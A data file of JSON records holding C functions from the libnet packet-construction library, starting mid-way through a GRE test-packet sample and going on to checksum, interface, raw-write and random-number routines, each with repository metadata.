{\n\tgre_dst_ip = libnet_get_prand(LIBNET_PRu32);\n    }\n\n    if (!gre_src_ip)\n    {\n\tgre_src_ip = libnet_get_prand(LIBNET_PRu32);\n    }\n\n\n    if ( (gre_flags & GRE_VERSION_MASK) == 0)\n    {\n\t/*\n\t * Build a TCP/IP packet embedded in GRE message\n\t */\n\tsize = LIBNET_TCP_H;\n\tt = libnet_build_tcp(\n\t    1234,                                       /* source port */\n\t    53,                                         /* destination port */\n\t    0x01010101,                                 /* sequence number */\n\t    0x02020202,                                 /* acknowledgement num */\n\t    TH_SYN,                                     /* control flags */\n\t    32767,                                      /* window size */\n\t    0,                                          /* checksum */\n\t    0,                                          /* urgent pointer */\n\t    size,                                       /* TCP packet size */\n\t    NULL,                                       /* payload */\n\t    0,                                          /* payload size */\n\t    l,                                          /* libnet handle */\n\t    0);                                         /* libnet id */\n\tif (t == -1)\n\t{\n\t    fprintf(stderr, \"Can't build TCP header (GRE): %s\\n\", libnet_geterror(l));\n\t    goto bad;\n\t}\n\t\n\tsize += LIBNET_IPV4_H;\n\tt = libnet_build_ipv4(\n\t    size,                                       /* length */\n\t    0,                                          /* TOS */\n\t    242,                                        /* IP ID */\n\t    0,                                          /* IP Frag */\n\t    64,                                         /* TTL */\n\t    IPPROTO_TCP,                                /* protocol */\n\t    0,                                          /* checksum */\n\t    gre_src_ip,                                 /* source IP */\n\t    gre_dst_ip,                                 /* destination IP */\n\t    NULL,                                       /* payload */\n\t    0,                                          /* payload size */\n\t    l,                                          /* libnet handle */\n\t    0);                                         /* libnet id */\n\tif (t == -1)\n\t{\n\t    fprintf(stderr, \"Can't build IP header (GRE): %s\\n\", libnet_geterror(l));\n\t    goto bad;\n\t} \n    }\n\n    if ( (gre_flags & GRE_VERSION_MASK) == 1)\n    {\n\toffset = libnet_get_prand(LIBNET_PRu16);\n\tif (~gre_flags & GRE_ACK)\n\t{\n\t    u_char ppp[4] = \"\\x00\\x01\"; /* PPP padding */\n\t    checksum = 2; /* checksum is in fact payload_s in PPP/GRE (v1) */\n\t    size = 2;\n\t    gre_flags|=GRE_SEQ;\n\t    key = libnet_get_prand(LIBNET_PRu32);\n\n\t    /*\n\t     * Build a PPP packet embedded in GRE message\n\t     */\n\t    t = libnet_build_data(\n\t\tppp,\n\t\tchecksum,\n\t\tl, \n\t\t0\n\t    );\n\t    if (t == -1)\n\t    {\n\t\tfprintf(stderr, \"Can't build PPP header (GRE): %s\\n\", libnet_geterror(l));\n\t\tgoto bad;\n\t    }\n\t}\n\tgre_flags&=~(GRE_CSUM|GRE_ROUTING);\n    }\n\n    /*\n     * Build the GRE message\n     */\n    if (gre_flags & GRE_ROUTING)\n    {\n\t/* as packet are stacked, start by the last one, ie null sre */\n\tsize += LIBNET_GRE_SRE_H;\n\tt = libnet_build_gre_last_sre(l, 0);\n\tif (t == -1)\n\t{\n\t    fprintf(stderr, \"Can't build GRE last SRE header: %s\\n\", libnet_geterror(l));\n\t    goto bad;\n\t}\n\tsize += LIBNET_GRE_SRE_H + strlen((char *)routing);\n\tt = libnet_build_gre_sre(\n\t    GRE_IP,                                 /* address family */\n\t    0,                                      /* offset */\n\t    strlen((char *)routing),                /* routing length */\n\t    routing,                                /* routing info */\n\t    NULL,                                   /* payload */\n\t    0,                                      /* payload size */\n\t    l,                                      /* libnet handle */\n\t    0);                                     /* libnet id */\n\tif (t == -1)\n\t{\n\t    fprintf(stderr, \"Can't build GRE last SRE header: %s\\n\", libnet_geterror(l));\n\t    goto bad;\n\t}\n    }\n\n    len = libnet_getgre_length(gre_flags);\n    size += len;\n    t = libnet_build_gre(\n        gre_flags,                                  /* flags & version */\n        (gre_flags & GRE_VERSION_1 ? GRE_PPP : GRE_IP), /* type */\n        checksum,                                   /* v0: checksum / v1: payload_s */\n        offset,                                     /* v0: offset   / v1: callID    */\n        key,                                        /* v0: key      / v1: seq bum   */\n        seq,                                        /* v0: seq num  / v1: ack       */\n\tsize,                                       /* length */\n        NULL,                                       /* payload */\n        0,                                          /* payload size */\n        l,                                          /* libnet handle */\n        0);                                         /* libnet id */\n    if (t == -1)\n    {\n        fprintf(stderr, \"Can't build GRE header: %s\\n\", libnet_geterror(l));\n        goto bad;\n    }\n\n    \n    /*\n     * Build the \"real\" IP header\n     */\n    size+=LIBNET_IPV4_H;\n    t = libnet_build_ipv4(\n        size,                                       /* length */\n        0,                                          /* TOS */\n        255,                                        /* IP ID */\n        0,                                          /* IP Frag */\n        255,                                        /* TTL */\n        IPPROTO_GRE,                                /* protocol */\n        0,                                          /* checksum */\n        src_ip,                                     /* source IP */\n        dst_ip,                                     /* destination IP */\n        NULL,                                       /* payload */\n        0,                                          /* payload size */\n        l,                                          /* libnet handle */\n        0);                                         /* libnet id */\n    if (t == -1)\n    {\n        fprintf(stderr, \"Can't build IP header (GRE): %s\\n\", libnet_geterror(l));\n        goto bad;\n    } \n\n    t = libnet_autobuild_ethernet(\n            (uint8_t *)\"11:11:11:11:11:11\",         /* ethernet destination */\n            ETHERTYPE_IP,                           /* protocol type */\n            l);                                     /* libnet handle */\n    if (t == -1)\n    {\n        fprintf(stderr, \"Can't build ethernet header: %s\\n\",\n                libnet_geterror(l));\n        goto bad;\n    }\n    /*\n     *  Write it to the wire.\n     */\n\n    c = libnet_write(l);\n    if (c == -1)\n    {\n        fprintf(stderr, \"Write error: %s\\n\", libnet_geterror(l));\n        goto bad;\n    }\n    else\n    {\n        fprintf(stderr, \"Wrote %d byte GRE packet; check the wire.\\n\", c);\n    }\n    libnet_destroy(l);\n    return (EXIT_SUCCESS);\nbad:\n    libnet_destroy(l);\n    return (EXIT_FAILURE); \n}", "path": "libnet/sample/gre.c", "commit_date": "2019-09-23 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/*\n * By testing if we can retrieve the FLAGS of an iface\n * we can know if it exists or not and if it is up.\n */\n", "func_signal": "int \nlibnet_check_iface(libnet_t *l)", "code": "{\n    struct ifreq ifr;\n    int fd, res;\n\n    fd = socket(AF_INET, SOCK_DGRAM, 0);\n    if (fd < 0)\n    {\n        snprintf(l->err_buf, LIBNET_ERRBUF_SIZE, \"%s() socket: %s\", __func__,\n                strerror(errno));\n        return (-1);\n    }\n\n    strncpy(ifr.ifr_name, l->device, sizeof(ifr.ifr_name) -1);\n    ifr.ifr_name[sizeof(ifr.ifr_name) - 1] = '\\0';\n    \n    res = ioctl(fd, SIOCGIFFLAGS, (int8_t *)&ifr);\n    if (res < 0)\n    {\n        snprintf(l->err_buf, LIBNET_ERRBUF_SIZE, \"%s() ioctl: %s\", __func__,\n                strerror(errno));\n    }\n    else\n    {\n        if ((ifr.ifr_flags & IFF_UP) == 0)\n        {\n            snprintf(l->err_buf, LIBNET_ERRBUF_SIZE, \"%s(): %s is down\",\n                    __func__, l->device);\n\t    res = -1;\n        }\n    }\n    close(fd);\n\n    return (res);\n}", "path": "libnet/src/libnet_if_addr.c", "commit_date": "2019-10-21 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/*\n *    Routing (variable)\n *\n *      The Routing field is optional and is present only if the Routing\n *      Present bit is set to 1.\n *\n *      The Routing field is a list of Source Route Entries (SREs).  Each\n *      SRE has the form:\n *\n *    0                   1                   2                   3\n *    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n *   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n *   |       Address Family          |  SRE Offset   |  SRE Length   |\n *   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n *   |                        Routing Information ...\n *   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n *\n */\n", "func_signal": "libnet_ptag_t\nlibnet_build_gre_sre(uint16_t af, uint8_t offset, uint8_t length, \nuint8_t *routing, const uint8_t *payload, uint32_t payload_s, libnet_t *l,\nlibnet_ptag_t ptag)", "code": "{\n    uint32_t n;\n    libnet_pblock_t *p;\n    struct libnet_gre_sre_hdr sre_hdr;\n\n    if (l == NULL)\n    { \n        return (-1); \n    }\n\n    n = LIBNET_GRE_SRE_H + length + payload_s;\n\n    /*\n     *  Find the existing protocol block if a ptag is specified, or create\n     *  a new one.\n     */\n    p = libnet_pblock_probe(l, ptag, n, LIBNET_PBLOCK_GRE_SRE_H);\n    if (p == NULL)\n    {\n        return (-1);\n    }\n    sre_hdr.af = htons(af);\n    sre_hdr.sre_offset = offset;\n    sre_hdr.sre_length = length;\n    if (libnet_pblock_append(l, p, (uint8_t *)&sre_hdr, LIBNET_GRE_SRE_H) == -1)\n    {\n        /* err msg set in libnet_pblock_append() */\n        goto bad; \n    }\n\n    if ((routing && !length) || (!routing && length))\n    {\n        snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n                 \"%s(): routing inconsistency\", __func__);\n        goto bad;\n    }\n\n    if (routing && length)\n    {\n        if (libnet_pblock_append(l, p, routing, length) == -1)\n        {\n            /* err msg set in libnet_pblock_append() */\n            goto bad;\n        }\n    }\n\n    /* boilerplate payload sanity check / append macro */\n    LIBNET_DO_PAYLOAD(l, p);\n\n    return (ptag ? ptag : libnet_pblock_update(l, p, 0, \n           LIBNET_PBLOCK_GRE_SRE_H));\n\nbad:\n    libnet_pblock_delete(l, p);\n    return (-1);\n\n}", "path": "libnet/src/libnet_build_gre.c", "commit_date": "2019-10-22 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/*\n * We are checksumming pblock \"q\"\n *\n * iphdr is the pointer to it's encapsulating IP header\n * protocol describes the type of \"q\", expressed as an IPPROTO_ value\n * h_len is the h_len from \"q\"\n */\n", "func_signal": "int\nlibnet_inet_checksum(libnet_t *l, uint8_t *iphdr, int protocol, int h_len, const uint8_t *beg, const uint8_t * end)", "code": "{\n    /* will need to update this for ipv6 at some point */\n    struct libnet_ipv4_hdr *iph_p = (struct libnet_ipv4_hdr *)iphdr;\n    struct libnet_ipv6_hdr *ip6h_p = NULL; /* default to not using IPv6 */\n    int ip_hl = 0;\n    int sum = 0;\n    uint8_t ip_nh = 0;\n\n    /* Check for memory under/over reads/writes. */\n    if(iphdr < beg || (iphdr+sizeof(*iph_p)) > end)\n    {\n        snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n            \"%s(): ipv4 hdr not inside packet (where %d, size %d)\", __func__,\n\t    (int)(iphdr-beg), (int)(end-beg));\n        return -1;\n    }\n\n    /*\n     *  Figure out which IP version we're dealing with.  We'll assume v4\n     *  and overlay a header structure to yank out the version.\n     */\n    if (iph_p->ip_v == 6)\n    {\n        ip6h_p = (struct libnet_ipv6_hdr *)iph_p;\n        iph_p = NULL;\n        ip_hl   = 40;\n        ip_nh = ip6h_p->ip_nh;\n\n        if((uint8_t*)(ip6h_p+1) > end)\n        {\n            snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n                    \"%s(): ipv6 hdr not inside packet\", __func__);\n            return -1;\n        }\n\n        /* FIXME this entire fragile exercise would be avoided if we just passed\n         * in the pointer to the protocol block 'q' we are checksumming, which\n         * we know.\n         */\n        while (ip_nh != protocol && (uint8_t*)ip6h_p + ip_hl + 1 < end)\n        {\n            /* next header is not the upper layer protocol */\n           switch (ip_nh)\n           {\n              case IPPROTO_DSTOPTS:\n              case IPPROTO_HOPOPTS:\n              case IPPROTO_ROUTING:\n              case IPPROTO_FRAGMENT:\n              case IPPROTO_AH:\n              case IPPROTO_ESP:\n              case IPPROTO_MH:\n                 /*\n                  * count option headers to the header length for\n                  * checksum processing\n                  */\n                 /* Common structure of ipv6 ext headers is:\n                  *  uint8: next header protocol\n                  *  uint8: length of this header, in multiples of 8, not\n                  *    including first eight octets\n                  * The pointer arithmetic below follows from above.\n                  */\n                 ip_nh = *((uint8_t*)ip6h_p+ip_hl); /* next next header */\n                 ip_hl += (*((uint8_t*)ip6h_p+ip_hl+1)+1)*8; /* ext header length */\n                 break;\n              default:\n                 snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n                     \"%s(): unsupported extension header (%d)\", __func__, ip_nh);\n                 return -1;\n           }\n\n        }\n    }\n    else\n    {\n        ip_hl = iph_p->ip_hl << 2;\n    }\n\n    if((iphdr+ip_hl) > end)\n    {\n        snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n            \"%s(): ip hdr len not inside packet\", __func__);\n        return -1;\n    }\n\n    /*\n     *  Dug Song came up with this very cool checksuming implementation\n     *  eliminating the need for explicit psuedoheader use.  Check it out.\n     */\n    switch (protocol)\n    {\n        case IPPROTO_TCP:\n        {\n            struct libnet_tcp_hdr *tcph_p =\n                (struct libnet_tcp_hdr *)(iphdr + ip_hl);\n\n\t    h_len = (int)(end - (uint8_t*) tcph_p); /* ignore h_len, sum the packet we've coalesced */\n\n            CHECK_IP_PAYLOAD_SIZE();\n\n#if (STUPID_SOLARIS_CHECKSUM_BUG)\n            tcph_p->th_sum = tcph_p->th_off << 2;\n            return (1);\n#endif /* STUPID_SOLARIS_CHECKSUM_BUG */\n#if (HAVE_HPUX11)   \n            if (l->injection_type != LIBNET_LINK)\n            {\n                /*\n                 *  Similiar to the Solaris Checksum bug - but need to add\n                 *  the size of the TCP payload (only for raw sockets).\n                 */\n                tcph_p->th_sum = (tcph_p->th_off << 2) +\n                        (h_len - (tcph_p->th_off << 2));\n                return (1); \n            }\n#endif\n            /* TCP checksum is over the IP pseudo header:\n             * ip src\n             * ip dst\n             * tcp protocol (IPPROTO_TCP)\n             * tcp length, including the header\n             * + the TCP header (with checksum set to zero) and data\n             */\n            tcph_p->th_sum = 0;\n            if (ip6h_p)\n            {\n                sum = libnet_in_cksum((uint16_t *)&ip6h_p->ip_src, 32);\n            }\n            else\n            {\n                /* 8 = src and dst */\n                sum = libnet_in_cksum((uint16_t *)&iph_p->ip_src, 8);\n            }\n            sum += ntohs(IPPROTO_TCP + h_len);\n            sum += libnet_in_cksum((uint16_t *)tcph_p, h_len);\n            tcph_p->th_sum = LIBNET_CKSUM_CARRY(sum);\n#if 0\n            printf(\"tcp sum calculated: %#x/%d h_len %d\\n\",\n                    ntohs(tcph_p->th_sum),\n                    ntohs(tcph_p->th_sum),\n                    h_len\n                  );\n#endif\n            break;\n        }\n        case IPPROTO_UDP:\n        {\n            struct libnet_udp_hdr *udph_p =\n                (struct libnet_udp_hdr *)(iphdr + ip_hl);\n\n\t    h_len = (int)(end - (uint8_t*) udph_p); /* ignore h_len, sum the packet we've coalesced */\n\n            CHECK_IP_PAYLOAD_SIZE();\n\n            udph_p->uh_sum = 0;\n            if (ip6h_p)\n            {\n                sum = libnet_in_cksum((uint16_t *)&ip6h_p->ip_src, 32);\n            }\n            else\n            {\n                sum = libnet_in_cksum((uint16_t *)&iph_p->ip_src, 8);\n            }\n            sum += ntohs(IPPROTO_UDP + h_len);\n            sum += libnet_in_cksum((uint16_t *)udph_p, h_len);\n            udph_p->uh_sum = LIBNET_CKSUM_CARRY(sum);\n            break;\n        }\n        case IPPROTO_ICMP:\n        {\n            struct libnet_icmpv4_hdr *icmph_p =\n                (struct libnet_icmpv4_hdr *)(iphdr + ip_hl);\n\n            h_len = (int)(end - (uint8_t*) icmph_p); /* ignore h_len, sum the packet we've coalesced */\n\n            CHECK_IP_PAYLOAD_SIZE();\n\n            icmph_p->icmp_sum = 0;\n            /* Hm, is this valid? Is the checksum algorithm for ICMPv6 encapsulated in IPv4\n             * actually defined?\n             */\n            if (ip6h_p)\n            {\n                sum = libnet_in_cksum((uint16_t *)&ip6h_p->ip_src, 32);\n                sum += ntohs(IPPROTO_ICMP6 + h_len);\n            }\n            sum += libnet_in_cksum((uint16_t *)icmph_p, h_len);\n            icmph_p->icmp_sum = LIBNET_CKSUM_CARRY(sum);\n            break;\n        }\n        case IPPROTO_ICMPV6:\n        {\n            struct libnet_icmpv6_hdr *icmph_p =\n                (struct libnet_icmpv6_hdr *)(iphdr + ip_hl);\n\n            h_len = (int)(end - (uint8_t*) icmph_p); /* ignore h_len, sum the packet we've coalesced */\n\n            CHECK_IP_PAYLOAD_SIZE();\n\n            icmph_p->icmp_sum = 0;\n            if (ip6h_p)\n            {\n                sum = libnet_in_cksum((uint16_t *)&ip6h_p->ip_src, 32);\n                sum += ntohs(IPPROTO_ICMP6 + h_len);\n            }\n            sum += libnet_in_cksum((uint16_t *)icmph_p, h_len);\n            icmph_p->icmp_sum = LIBNET_CKSUM_CARRY(sum);\n            break;\n        }\n        case IPPROTO_IGMP:\n        {\n            struct libnet_igmp_hdr *igmph_p =\n                (struct libnet_igmp_hdr *)(iphdr + ip_hl);\n\n\t    h_len = (int)(end - (uint8_t*) igmph_p); /* ignore h_len, sum the packet we've coalesced */\n\n            CHECK_IP_PAYLOAD_SIZE();\n\n            igmph_p->igmp_sum = 0;\n            sum = libnet_in_cksum((uint16_t *)igmph_p, h_len);\n            igmph_p->igmp_sum = LIBNET_CKSUM_CARRY(sum);\n            break;\n        }\n\tcase IPPROTO_GRE:\n\t{\n            /* checksum is always at the same place in GRE header\n             * in the multiple RFC version of the protocol ... ouf !!!\n             */\n\t    struct libnet_gre_hdr *greh_p = \n\t\t(struct libnet_gre_hdr *)(iphdr + ip_hl);\n\t    uint16_t fv = ntohs(greh_p->flags_ver);\n\n            CHECK_IP_PAYLOAD_SIZE();\n\n\t    if (!(fv & (GRE_CSUM|GRE_ROUTING | GRE_VERSION_0)) ||\n                !(fv & (GRE_CSUM|GRE_VERSION_1)))\n\t    {\n\t\tsnprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n                \"%s(): can't compute GRE checksum (wrong flags_ver bits: 0x%x )\",  __func__, fv);\n\t\treturn (-1);\n\t    }\n\t    sum = libnet_in_cksum((uint16_t *)greh_p, h_len);\n\t    greh_p->gre_sum = LIBNET_CKSUM_CARRY(sum);\n\t    break;\n\t}\n        case IPPROTO_OSPF:\n        {\n            struct libnet_ospf_hdr *oh_p =\n                (struct libnet_ospf_hdr *)(iphdr + ip_hl);\n\n            CHECK_IP_PAYLOAD_SIZE();\n\n            oh_p->ospf_sum = 0;\n            sum += libnet_in_cksum((uint16_t *)oh_p, h_len);\n            oh_p->ospf_sum = LIBNET_CKSUM_CARRY(sum);\n            break;\n        }\n        case IPPROTO_OSPF_LSA:\n        {\n            struct libnet_ospf_hdr *oh_p =\n                (struct libnet_ospf_hdr *)(iphdr + ip_hl);\n            struct libnet_lsa_hdr *lsa_p =\n                (struct libnet_lsa_hdr *)(iphdr + \n                ip_hl + oh_p->ospf_len);\n\n            /* FIXME need additional length check, to account for ospf_len */\n            lsa_p->lsa_sum = 0;\n            sum += libnet_in_cksum((uint16_t *)lsa_p, h_len);\n            lsa_p->lsa_sum = LIBNET_CKSUM_CARRY(sum);\n            break;\n#if 0\n            /*\n             *  Reworked fletcher checksum taken from RFC 1008.\n             */\n            int c0, c1;\n            struct libnet_lsa_hdr *lsa_p = (struct libnet_lsa_hdr *)buf;\n            uint8_t *p, *p1, *p2, *p3;\n\n            c0 = 0;\n            c1 = 0;\n\n            lsa_p->lsa_cksum = 0;\n\n            p = buf;\n            p1 = buf;\n            p3 = buf + len;             /* beginning and end of buf */\n\n            while (p1 < p3)\n            {\n                p2 = p1 + LIBNET_MODX;\n                if (p2 > p3)\n                {\n                    p2 = p3;\n                }\n  \n                for (p = p1; p < p2; p++)\n                {\n                    c0 += (*p);\n                    c1 += c0;\n                }\n\n                c0 %= 255;\n                c1 %= 255;      /* modular 255 */\n \n                p1 = p2;\n            }\n\n#if AWR_PLEASE_REWORK_THIS\n            lsa_p->lsa_cksum[0] = (((len - 17) * c0 - c1) % 255);\n            if (lsa_p->lsa_cksum[0] <= 0)\n            {\n                lsa_p->lsa_cksum[0] += 255;\n            }\n\n            lsa_p->lsa_cksum[1] = (510 - c0 - lsa_p->lsa_cksum[0]);\n            if (lsa_p->lsa_cksum[1] > 255)\n            {\n                lsa_p->lsa_cksum[1] -= 255;\n            }\n#endif\n            break;\n#endif\n        }\n        case IPPROTO_IP:\n        {\n            if(!iph_p) {\n                /* IPv6 doesn't have a checksum */\n            } else {\n                iph_p->ip_sum = 0;\n                sum = libnet_in_cksum((uint16_t *)iph_p, ip_hl);\n                iph_p->ip_sum = LIBNET_CKSUM_CARRY(sum);\n            }\n            break;\n        }\n        case IPPROTO_VRRP:\n        {\n            struct libnet_vrrp_hdr *vrrph_p =\n                (struct libnet_vrrp_hdr *)(iphdr + ip_hl);\n            CHECK_IP_PAYLOAD_SIZE();\n\n            vrrph_p->vrrp_sum = 0;\n            sum = libnet_in_cksum((uint16_t *)vrrph_p, h_len);\n            vrrph_p->vrrp_sum = LIBNET_CKSUM_CARRY(sum);\n            break;\n        }\n        case LIBNET_PROTO_CDP:\n        {   /* XXX - Broken: how can we easily get the entire packet size? */\n\t    /* FIXME you can't, checksumming non-IP protocols was not supported by libnet */\n            struct libnet_cdp_hdr *cdph_p =\n                (struct libnet_cdp_hdr *)iphdr;\n\n            if((iphdr+h_len) > end)\n            {\n                snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n                        \"%s(): cdp payload not inside packet\", __func__);\n                return -1;\n            }\n\n            cdph_p->cdp_sum = 0;\n            sum = libnet_in_cksum((uint16_t *)cdph_p, h_len);\n            cdph_p->cdp_sum = LIBNET_CKSUM_CARRY(sum);\n            break;\n        }\n        case LIBNET_PROTO_ISL:\n        {\n#if 0\n            struct libnet_isl_hdr *islh_p =\n                (struct libnet_isl_hdr *)buf;\n#endif\n            /*\n             *  Need to compute 4 byte CRC for the ethernet frame and for\n             *  the ISL frame itself.  Use the libnet_crc function.\n             */\n        }\n        default:\n        {\n            snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n                \"%s(): unsupported protocol %d\", __func__, protocol);\n            return (-1);\n        }\n    }\n    return (1);\n}", "path": "libnet/src/libnet_checksum.c", "commit_date": "2019-10-09 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* WIN32 */\n", "func_signal": "uint8_t *\nlibnet_hex_aton(const char *s, int *len)", "code": "{\n    uint8_t *buf;\n    int i;\n    int32_t l;\n    char *pp;\n        \n    while (isspace(*s))\n    {\n        s++;\n    }\n    for (i = 0, *len = 0; s[i]; i++)\n    {\n        if (s[i] == ':')\n        {\n            (*len)++;\n        }\n    }\n    buf = malloc(*len + 1);\n    if (buf == NULL)\n    {\n        return (NULL);\n    }\n    /* expect len hex octets separated by ':' */\n    for (i = 0; i < *len + 1; i++)\n    {\n        l = strtol(s, &pp, 16);\n        if (pp == s || l > 0xff || l < 0)\n        {\n            *len = 0;\n            free(buf);\n            return (NULL);\n        }\n        if (!(*pp == ':' || (i == *len && (isspace(*pp) || *pp == '\\0'))))\n        {\n            *len = 0;\n            free(buf);\n            return (NULL);\n        }\n        buf[i] = (uint8_t)l;\n        s = pp + 1;\n    }\n    /* return int8_tacter after the octets ala strtol(3) */\n    (*len)++;\n    return (buf);\n}", "path": "libnet/src/libnet_resolve.c", "commit_date": "2019-10-22 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* __WIN32__ */\n", "func_signal": "int\nlibnet_write_raw_ipv4(libnet_t *l, const uint8_t *packet, uint32_t size)", "code": "{\n    ssize_t c;\n    struct sockaddr_in sin;\n    struct libnet_ipv4_hdr *ip_hdr;\n\n    if (l == NULL)\n    {\n        return (-1);\n    }\n\n    ip_hdr = (struct libnet_ipv4_hdr *)packet;\n\n#if (LIBNET_BSD_BYTE_SWAP)\n    /*\n     *  For link access, we don't need to worry about the inconsistencies of\n     *  certain BSD kernels.  However, raw socket nuances abound.  Certain\n     *  BSD implementations require the ip_len and ip_off fields to be in host\n     *  byte order.\n     */\n    ip_hdr->ip_len = FIX(ip_hdr->ip_len);\n    ip_hdr->ip_off = FIX(ip_hdr->ip_off);\n#endif /* LIBNET_BSD_BYTE_SWAP */\n\n    memset(&sin, 0, sizeof(sin));\n    sin.sin_family  = AF_INET;\n    sin.sin_addr.s_addr = ip_hdr->ip_dst.s_addr;\n\n    c = sendto(l->fd, packet, size, 0, (struct sockaddr *)&sin,\n            sizeof(sin));\n\n#if (LIBNET_BSD_BYTE_SWAP)\n    ip_hdr->ip_len = UNFIX(ip_hdr->ip_len);\n    ip_hdr->ip_off = UNFIX(ip_hdr->ip_off);\n#endif /* LIBNET_BSD_BYTE_SWAP */\n\n    if (c != (ssize_t)size)\n    {\n        snprintf(l->err_buf, LIBNET_ERRBUF_SIZE,\n                \"%s(): %zd bytes written (%s)\", __func__, c,\n                strerror(errno));\n    }\n    return (c);\n}", "path": "libnet/src/libnet_write.c", "commit_date": "2019-10-22 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* FIXME this code makes no sense. On unix we use random(), which\n * is intended to have no security, and under win32 we use cryptographically\n * strong entropy source? If necessary, why aren't we using /dev/random\n * on unix? What's going on here?\n */\n", "func_signal": "uint32_t\nlibnet_get_prand(int mod)", "code": "{\n    uint32_t n;  /* 0 to 4,294,967,295 */\n#ifndef WIN32\n    n = random();\n#else\n    HCRYPTPROV hProv = 0;\n\n    CryptAcquireContext(&hProv,\n                        0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);\n\n    CryptGenRandom(hProv, sizeof(n), (BYTE*)&n);\n    CryptReleaseContext(hProv, 0);\n#endif\n    switch (mod)\n    {\n        case LIBNET_PR2:\n            return (n & 0x1);           /* 0 - 1 */\n        case LIBNET_PR8:\n            return (n & 0xff);          /* 0 - 255 */\n        case LIBNET_PR16:\n            return (n & 0x7fff);        /* 0 - 32767 */\n        case LIBNET_PRu16:\n            return (n & 0xffff);        /* 0 - 65535 */\n        case LIBNET_PR32:\n            return (n & 0x7fffffff);    /* 0 - 2147483647 */\n        case LIBNET_PRu32:\n            return (n);                 /* 0 - 4294967295 */\n    }\n    return (0);                         /* NOTTREACHED */\n}", "path": "libnet/src/libnet_prand.c", "commit_date": "2019-10-08 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/*\n * For backwards binary compatibility. The calculations done here can easily\n * result in buffer overreads and overwrites. You have been warned. And no, it\n * is not possible to fix, the API contains no information on the buffer's\n * boundary. libnet itself calls the safe function, libnet_inet_checksum(). So\n * should you.\n */\n", "func_signal": "int\nlibnet_do_checksum(libnet_t *l, uint8_t *iphdr, int protocol, int h_len)", "code": "{\n    uint16_t ip_len = 0;\n    struct libnet_ipv4_hdr* ip4 = (struct libnet_ipv4_hdr *)iphdr;\n    struct libnet_ipv6_hdr* ip6 = (struct libnet_ipv6_hdr *)iphdr;\n\n    if(ip4->ip_v == 6) {\n        ip_len = ntohs(ip6->ip_len);\n    } else {\n        ip_len = ntohs(ip4->ip_len);\n    }\n\n    return libnet_inet_checksum(l, iphdr, protocol, h_len,\n            iphdr, iphdr + ip_len\n            );\n}", "path": "libnet/src/libnet_checksum.c", "commit_date": "2019-10-09 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
{"docstring": "/* Sometimes the network device is at /dev/<ifname>, and sometimes at\n * /dev/net/<ifname>. Sometimes both. Sometimes with unit number, sometimes\n * without.\n * This function tries to find the device, and won't be stopped just because\n * it tried to open a directory. (e.g. interface net0 would try to open\n * /dev/net).\n */\n", "func_signal": "static int\ntry_open_dev(libnet_t *l, const char *dev, int unit)", "code": "{\n    const char *prefixes[] = {\n        DLPI_DEV_PREFIX,\n        \"/dev\",\n        \"/dev/net\",\n        \"\",\n        NULL\n    };\n    int ret;\n    char fullpath[MAXPATHLEN];\n    int cur_prefix;\n\n    for (cur_prefix = 0; prefixes[cur_prefix]; cur_prefix++) {\n        snprintf(fullpath, sizeof(fullpath),\n                 \"%s/%s\", prefixes[cur_prefix], dev);\n        if (0 <= (ret = open(fullpath, O_RDWR))) {\n            return ret;\n        }\n        if (errno != ENOENT && errno != EISDIR) {\n            snprintf(l->err_buf, LIBNET_ERRBUF_SIZE, \"%s(): open(): %s: %s\",\n                     __func__, fullpath, strerror(errno));\n            return -1;\n        }\n        snprintf(fullpath, sizeof(fullpath),\n                 \"%s/%s%d\", prefixes[cur_prefix], dev, unit);\n        if (0 <= (ret = open(fullpath, O_RDWR))) {\n            return ret;\n        }\n        if (errno != ENOENT && errno != EISDIR) {\n            snprintf(l->err_buf, LIBNET_ERRBUF_SIZE, \"%s(): open(): %s: %s\",\n                     __func__, fullpath, strerror(errno));\n            return -1;\n        }\n    }\n    return -1;\n}", "path": "libnet/src/libnet_link_dlpi.c", "commit_date": "2019-10-20 00:00:00", "repo_name": "libnet/libnet", "stars": 863, "license": "bsd-2-clause", "language": "c", "size": 5431}
